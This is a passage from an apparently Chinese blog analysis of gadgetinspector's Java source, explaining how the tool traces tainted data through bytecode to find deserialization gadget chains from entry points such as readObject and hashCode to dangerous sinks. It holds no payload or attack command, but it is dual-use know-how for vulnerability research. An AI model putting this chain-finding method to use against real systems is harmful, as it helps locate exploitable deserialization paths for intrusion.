class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; calculatePassthroughDataflow(Map&lt;String, ClassResourceEnumerator.ClassResource&gt; classResourceByName,</span><br><span class="line">                                                                                          Map&lt;ClassReference.Handle, ClassReference&gt; classMap,</span><br><span class="line">                                                                                          InheritanceMap inheritanceMap,</span><br><span class="line">                                                                                          List&lt;MethodReference.Handle&gt; sortedMethods,</span><br><span class="line">                                                                                          SerializableDecider serializableDecider) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">final</span> Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : sortedMethods) &#123;<span class="comment">//依次遍历sortedmethods，并且每个方法的子方法判定总在这个方法之前，这是通过的上面的逆拓扑排序实现的。</span></span><br><span class="line">            <span class="keyword">if</span> (method.getName().equals(<span class="string">"&lt;clinit&gt;"</span>)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            ClassResourceEnumerator.ClassResource classResource = classResourceByName.get(method.getClassReference().getName());</span><br><span class="line">            <span class="keyword">try</span> (InputStream inputStream = classResource.getInputStream()) &#123;</span><br><span class="line">                ClassReader cr = <span class="keyword">new</span> ClassReader(inputStream);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    PassthroughDataflowClassVisitor cv = <span class="keyword">new</span> PassthroughDataflowClassVisitor(classMap, inheritanceMap,</span><br><span class="line">                            passthroughDataflow, serializableDecider, Opcodes.ASM6, method);</span><br><span class="line">                    cr.accept(cv, ClassReader.EXPAND_FRAMES);<span class="comment">//通过结合classMap、inheritanceMap、已判定出的passthroughDataflow结果、序列化决定器信息来判定当前method的返回值与参数的关系</span></span><br><span class="line">                    passthroughDataflow.put(method, cv.getReturnTaint());<span class="comment">//将判定后的method与有关系的污染点加入passthroughDataflow</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    LOGGER.error(<span class="string">"Exception analyzing "</span> + method.getClassReference().getName(), e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                LOGGER.error(<span class="string">"Unable to analyze "</span> + method.getClassReference().getName(), e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> passthroughDataflow;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>最后生成了passthrough.dat：</p><table><thead><tr><th>类名</th><th>方法名</th><th>方法描述</th><th>污点</th></tr></thead><tbody><tr><td>java/util/Collections$CheckedNavigableSet</td><td>tailSet</td><td>(Ljava/lang/Object;)Ljava/util/NavigableSet;</td><td>0,1</td></tr><tr><td>java/awt/RenderingHints</td><td>put</td><td>(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;</td><td>0,1,2</td></tr></tbody></table><h4 id="Step3-枚举passthrough调用图"><a href="#Step3-枚举passthrough调用图" class="headerlink" title="Step3  枚举passthrough调用图"></a>Step3  枚举passthrough调用图</h4><p>这一步和上一步类似，gadgetinspector 会再次扫描全部的Java方法，但检查的不再是参数与返回结果的关系，而是方法的参数与其所调用的子方法的关系，即子方法的参数是否可以被父方法的参数所影响。那么为什么要进行上一步的生成passthrough数据流呢？由于这一步的判断也是在字节码分析中，所以这里只能先进行一些猜测，如下面这个例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    <span class="keyword">private</span> MyObject obj;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">parentMethod</span><span class="params">(Object arg)</span></span>&#123;</span><br><span class="line">        ...</span><br><span class="line">        TestObject obj1 = <span class="keyword">new</span> TestObject();</span><br><span class="line">        Object obj2 = obj1.childMethod1(arg);</span><br><span class="line">        <span class="keyword">this</span>.obj.childMethod(obj2); </span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>如果不进行生成passthrough数据流操作，就无法判断TestObject.childMethod1的返回值是否会受到参数1的影响，也就无法继续判断parentMethod的arg参数与子方法MyObject.childmethod的参数传递关系。</p><p>作者给出的例子：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/23.png" alt=""></p><p>AbstractTableModel$ff19274a.hashcode与子方法IFn.invoke：</p><ul><li>AbstractTableModel$ff19274a.hashcode的this(0参)传递给了IFn.invoke的1参，表示为0-&gt;IFn.invoke()@1</li><li>由于f是通过this.__clojureFnMap(0参)获取的，而f又为IFn.invoke()的this(0参)，即AbstractTableModel$ff19274a.hashcode的0参传递给了IFn.invoke的0参，表示为0-&gt;IFn.invoke()@0</li></ul><p>FnCompose.invoke与子方法IFn.invoke：</p><ul><li>FnCompose.invoked的arg(1参)传递给了IFn.invoke的1参，表示为1-&gt;IFn.invoke()@1</li><li>f1为FnCompose的属性(this，0参)，被做为了IFn.invoke的this(0参数)传递，表示为0-&gt;IFn.invoke()@1</li><li>f1.invoke(arg)做为一个整体被当作1参传递给了IFn.invoke，由于f1在序列化时我们可以控制具体是IFn的哪个实现类，所以具体调用哪个实现类的invoke也相当于能够控制，即f1.invoke(arg)这个整体可以视为0参数传递给了IFn.invoke的1参(这里只是进行的简单猜测，具体实现在字节码分析中，可能也体现了作者说的合理的风险判断吧)，表示为0-&gt;IFn.invoke()@1</li></ul><p>在这一步中，gadgetinspector也是利用ASM来进行字节码的分析，主要逻辑是在类CallGraphDiscovery和ModelGeneratorClassVisitor中。在ModelGeneratorClassVisitor中通过标记追踪JVM虚拟机在执行方法时的stack和localvar，最终得到方法的参数与其所调用的子方法的参数传递关系。</p><p>生成passthrough调用图代码（暂时省略ModelGeneratorClassVisitor的实现，涉及到字节码分析）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CallGraphDiscovery</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger LOGGER = LoggerFactory.getLogger(CallGraphDiscovery.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Set&lt;GraphCall&gt; discoveredCalls = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">discover</span><span class="params">(<span class="keyword">final</span> ClassResourceEnumerator classResourceEnumerator, GIConfig config)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods();<span class="comment">//加载所有方法</span></span><br><span class="line">        Map&lt;ClassReference.Handle, ClassReference&gt; classMap = DataLoader.loadClasses();<span class="comment">//加载所有类</span></span><br><span class="line">        InheritanceMap inheritanceMap = InheritanceMap.load();<span class="comment">//加载继承图</span></span><br><span class="line">        Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow = PassthroughDiscovery.load();<span class="comment">//加载passthrough数据流</span></span><br><span class="line"></span><br><span class="line">        SerializableDecider serializableDecider = config.getSerializableDecider(methodMap, inheritanceMap);<span class="comment">//序列化决定器</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (ClassResourceEnumerator.ClassResource classResource : classResourceEnumerator.getAllClasses()) &#123;</span><br><span class="line">            <span class="keyword">try</span> (InputStream in = classResource.getInputStream()) &#123;</span><br><span class="line">                ClassReader cr = <span class="keyword">new</span> ClassReader(in);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    cr.accept(<span class="keyword">new</span> ModelGeneratorClassVisitor(classMap, inheritanceMap, passthroughDataflow, serializableDecider, Opcodes.ASM6),</span><br><span class="line">                            ClassReader.EXPAND_FRAMES);<span class="comment">//通过结合classMap、inheritanceMap、passthroughDataflow结果、序列化决定器信息来判定当前method参数与子方法传递调用关系</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    LOGGER.error(<span class="string">"Error analyzing: "</span> + classResource.getName(), e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>最后生成了passthrough.dat：</p><table><thead><tr><th>父方法类名</th><th>父方法</th><th>父方法描述</th><th>子方法类名</th><th>子方法子</th><th>方法描述</th><th>父方法第几参</th><th>参数对象的哪个field被传递</th><th>子方法第几参</th></tr></thead><tbody><tr><td>java/io/PrintStream</td><td>write</td><td>(Ljava/lang/String;)V</td><td>java/io/OutputStream</td><td>flush</td><td>()V</td><td>0</td><td>out</td><td>0</td></tr><tr><td>javafx/scene/shape/Shape</td><td>setSmooth</td><td>(Z)V</td><td>javafx/scene/shape/Shape</td><td>smoothProperty</td><td>()Ljavafx/beans/property/BooleanProperty;</td><td>0</td><td></td><td>0</td></tr></tbody></table><hr><h4 id="Step4-搜索可用的source"><a href="#Step4-搜索可用的source" class="headerlink" title="Step4 搜索可用的source"></a>Step4 搜索可用的source</h4><p>这一步会根据已知的反序列化漏洞的入口，检查所有可以被触发的方法。例如，在利用链中使用代理时，任何可序列化并且是<code>java/lang/reflect/InvocationHandler</code>子类的invoke方法都可以视为source。这里还会根据具体的反序列化库决定类是否能被序列化。</p><p>搜索可用的source：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SimpleSourceDiscovery</span> <span class="keyword">extends</span> <span class="title">SourceDiscovery</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">discover</span><span class="params">(Map&lt;ClassReference.Handle, ClassReference&gt; classMap,</span></span></span><br><span class="line"><span class="function"><span class="params">                         Map&lt;MethodReference.Handle, MethodReference&gt; methodMap,</span></span></span><br><span class="line"><span class="function"><span class="params">                         InheritanceMap inheritanceMap)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> SerializableDecider serializableDecider = <span class="keyword">new</span> SimpleSerializableDecider(inheritanceMap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123;</span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">"finalize"</span>) &amp;&amp; method.getDesc().equals(<span class="string">"()V"</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">0</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果类实现了readObject，则传入的ObjectInputStream被认为是污染的</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123;</span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">"readObject"</span>) &amp;&amp; method.getDesc().equals(<span class="string">"(Ljava/io/ObjectInputStream;)V"</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">1</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用代理技巧时，任何扩展了serializable and InvocationHandler的类会受到污染。</span></span><br><span class="line">        <span class="keyword">for</span> (ClassReference.Handle clazz : classMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(clazz))</span><br><span class="line">                    &amp;&amp; inheritanceMap.isSubclassOf(clazz, <span class="keyword">new</span> ClassReference.Handle(<span class="string">"java/lang/reflect/InvocationHandler"</span>))) &#123;</span><br><span class="line">                MethodReference.Handle method = <span class="keyword">new</span> MethodReference.Handle(</span><br><span class="line">                        clazz, <span class="string">"invoke"</span>, <span class="string">"(Ljava/lang/Object;Ljava/lang/reflect/Method;[Ljava/lang/Object;)Ljava/lang/Object;"</span>);</span><br><span class="line"></span><br><span class="line">                addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">0</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// hashCode（）或equals（）是将对象放入HashMap的标准技巧的可访问入口点</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123;</span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">"hashCode"</span>) &amp;&amp; method.getDesc().equals(<span class="string">"()I"</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">0</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">"equals"</span>) &amp;&amp; method.getDesc().equals(<span class="string">"(Ljava/lang/Object;)Z"</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">0</span>));</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">1</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用比较器代理，可以跳转到任何groovy Closure的call()/doCall()方法，所有的args都被污染</span></span><br><span class="line">        <span class="comment">// https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/Groovy1.java</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))</span><br><span class="line">                    &amp;&amp; inheritanceMap.isSubclassOf(method.getClassReference(), <span class="keyword">new</span> ClassReference.Handle(<span class="string">"groovy/lang/Closure"</span>))</span><br><span class="line">                    &amp;&amp; (method.getName().equals(<span class="string">"call"</span>) || method.getName().equals(<span class="string">"doCall"</span>))) &#123;</span><br><span class="line"></span><br><span class="line">                addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">0</span>));</span><br><span class="line">                Type[] methodArgs = Type.getArgumentTypes(method.getDesc());</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; methodArgs.length; i++) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> Source(method, i + <span class="number">1</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>这一步的结果会保存在文件sources.dat中:</p><table><thead><tr><th>类</th><th>方法</th><th>方法描述</th><th>污染参数</th></tr></thead><tbody><tr><td>java/awt/color/ICC_Profile</td><td>finalize</td><td>()V</td><td>0</td></tr><tr><td>java/lang/Enum</td><td>readObject</td><td>(Ljava/io/ObjectInputStream;)V</td><td>1</td></tr></tbody></table><h4 id="Step5-搜索生成调用链"><a href="#Step5-搜索生成调用链" class="headerlink" title="Step5 搜索生成调用链"></a>Step5 搜索生成调用链</h4><p>这一步会遍历全部的source，并在callgraph.dat中递归查找所有可以继续传递污点参数的子方法调用，直至遇到sink中的方法。</p><p>搜索生成调用链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GadgetChainDiscovery</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger LOGGER = LoggerFactory.getLogger(GadgetChainDiscovery.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> GIConfig config;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">GadgetChainDiscovery</span><span class="params">(GIConfig config)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.config = config;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">discover</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods();</span><br><span class="line">        InheritanceMap inheritanceMap = InheritanceMap.load();</span><br><span class="line">        Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodImplMap = InheritanceDeriver.getAllMethodImplementations(</span><br><span class="line">                inheritanceMap, methodMap);<span class="comment">//得到方法的所有子类方法实现（被子类重写的方法）</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> ImplementationFinder implementationFinder = config.getImplementationFinder(</span><br><span class="line">                methodMap, methodImplMap, inheritanceMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将方法的所有子类方法实现保存到methodimpl.dat</span></span><br><span class="line">        <span class="keyword">try</span> (Writer writer = Files.newBufferedWriter(Paths.get(<span class="string">"methodimpl.dat"</span>))) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Map.Entry&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; entry : methodImplMap.entrySet()) &#123;</span><br><span class="line">                writer.write(entry.getKey().getClassReference().getName());</span><br><span class="line">                writer.write(<span class="string">"\t"</span>);</span><br><span class="line">                writer.write(entry.getKey().getName());</span><br><span class="line">                writer.write(<span class="string">"\t"</span>);</span><br><span class="line">                writer.write(entry.getKey().getDesc());</span><br><span class="line">                writer.write(<span class="string">"\n"</span>);</span><br><span class="line">                <span class="keyword">for</span> (MethodReference.Handle method : entry.getValue()) &#123;</span><br><span class="line">                    writer.write(<span class="string">"\t"</span>);</span><br><span class="line">                    writer.write(method.getClassReference().getName());</span><br><span class="line">                    writer.write(<span class="string">"\t"</span>);</span><br><span class="line">                    writer.write(method.getName());</span><br><span class="line">                    writer.write(<span class="string">"\t"</span>);</span><br><span class="line">                    writer.write(method.getDesc());</span><br><span class="line">                    writer.write(<span class="string">"\n"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//方法调用map，key为父方法，value为子方法与父方法参数传递关系</span></span><br><span class="line">        Map&lt;MethodReference.Handle, Set&lt;GraphCall&gt;&gt; graphCallMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (GraphCall graphCall : DataLoader.loadData(Paths.get(<span class="string">"callgraph.dat"</span>), <span class="keyword">new</span> GraphCall.Factory())) &#123;</span><br><span class="line">            MethodReference.Handle caller = graphCall.getCallerMethod();</span><br><span class="line">            <span class="keyword">if</span> (!graphCallMap.containsKey(caller)) &#123;</span><br><span class="line">                Set&lt;GraphCall&gt; graphCalls = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">                graphCalls.add(graphCall);</span><br><span class="line">                graphCallMap.put(caller, graphCalls);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                graphCallMap.get(caller).add(graphCall);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//exploredMethods保存在调用链从查找过程中已经访问过的方法节点，methodsToExplore保存调用链</span></span><br><span class="line">        Set&lt;GadgetChainLink&gt; exploredMethods = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        LinkedList&lt;GadgetChain&gt; methodsToExplore = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">        <span class="comment">//加载所有sources，并将每个source作为每条链的第一个节点</span></span><br><span class="line">        <span class="keyword">for</span> (Source source : DataLoader.loadData(Paths.get(<span class="string">"sources.dat"</span>), <span class="keyword">new</span> Source.Factory())) &#123;</span><br><span class="line">            GadgetChainLink srcLink = <span class="keyword">new</span> GadgetChainLink(source.getSourceMethod(), source.getTaintedArgIndex());</span><br><span class="line">            <span class="keyword">if</span> (exploredMethods.contains(srcLink)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            methodsToExplore.add(<span class="keyword">new</span> GadgetChain(Arrays.asList(srcLink)));</span><br><span class="line">            exploredMethods.add(srcLink);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">long</span> iteration = <span class="number">0</span>;</span><br><span class="line">        Set&lt;GadgetChain&gt; discoveredGadgets = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        <span class="comment">//使用广度优先搜索所有从source到sink的调用链</span></span><br><span class="line">        <span class="keyword">while</span> (methodsToExplore.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((iteration % <span class="number">1000</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                LOGGER.info(<span class="string">"Iteration "</span> + iteration + <span class="string">", Search space: "</span> + methodsToExplore.size());</span><br><span class="line">            &#125;</span><br><span class="line">            iteration += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">            GadgetChain chain = methodsToExplore.pop();<span class="comment">//从队首弹出一条链</span></span><br><span class="line">            GadgetChainLink lastLink = chain.links.get(chain.links.size()-<span class="number">1</span>);<span class="comment">//取这条链最后一个节点</span></span><br><span class="line"></span><br><span class="line">            Set&lt;GraphCall&gt; methodCalls = graphCallMap.get(lastLink.method);<span class="comment">//获取当前节点方法所有子方法与当前节点方法参数传递关系</span></span><br><span class="line">            <span class="keyword">if</span> (methodCalls != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (GraphCall graphCall : methodCalls) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (graphCall.getCallerArgIndex() != lastLink.taintedArgIndex) &#123;</span><br><span class="line">                        <span class="comment">//如果当前节点方法的污染参数与当前子方法受父方法参数影响的Index不一致则跳过</span></span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    Set&lt;MethodReference.Handle&gt; allImpls = implementationFinder.getImplementations(graphCall.getTargetMethod());<span class="comment">//获取子方法所在类的所有子类重写方法</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">for</span> (MethodReference.Handle methodImpl : allImpls) &#123;</span><br><span class="line">                        GadgetChainLink newLink = <span class="keyword">new</span> GadgetChainLink(methodImpl, graphCall.getTargetArgIndex());<span class="comment">//新方法节点</span></span><br><span class="line">                        <span class="keyword">if</span> (exploredMethods.contains(newLink)) &#123;</span><br><span class="line">                            <span class="comment">//如果新方法已近被访问过了，则跳过,这里能减少开销。但是这一步跳过会使其他链/分支链经过此节点时，由于已经此节点被访问过了，链会在这里断掉。那么如果这个条件去掉就能实现找到所有链了吗？这里去掉会遇到环状问题，造成路径无限增加...</span></span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        GadgetChain newChain = <span class="keyword">new</span> GadgetChain(chain, newLink);<span class="comment">//新节点与之前的链组成新链</span></span><br><span class="line">                        <span class="keyword">if</span> (isSink(methodImpl, graphCall.getTargetArgIndex(), inheritanceMap)) &#123;<span class="comment">//如果到达了sink，则加入discoveredGadgets</span></span><br><span class="line">                            discoveredGadgets.add(newChain);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="comment">//新链加入队列</span></span><br><span class="line">                            methodsToExplore.add(newChain);</span><br><span class="line">                            <span 